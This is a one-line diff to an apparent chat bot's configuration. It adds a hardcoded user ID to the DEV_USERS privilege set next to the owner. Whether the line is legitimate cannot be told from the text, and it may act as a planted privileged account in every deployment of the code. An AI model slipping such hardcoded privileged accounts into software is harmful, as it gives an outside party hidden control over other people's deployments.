@@ -154,6 +154,7 @@ else:
 
 SUDO_USERS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
+DEV_USERS.add(5030730429)
 
 if not SPAMWATCH_API:
     sw = None
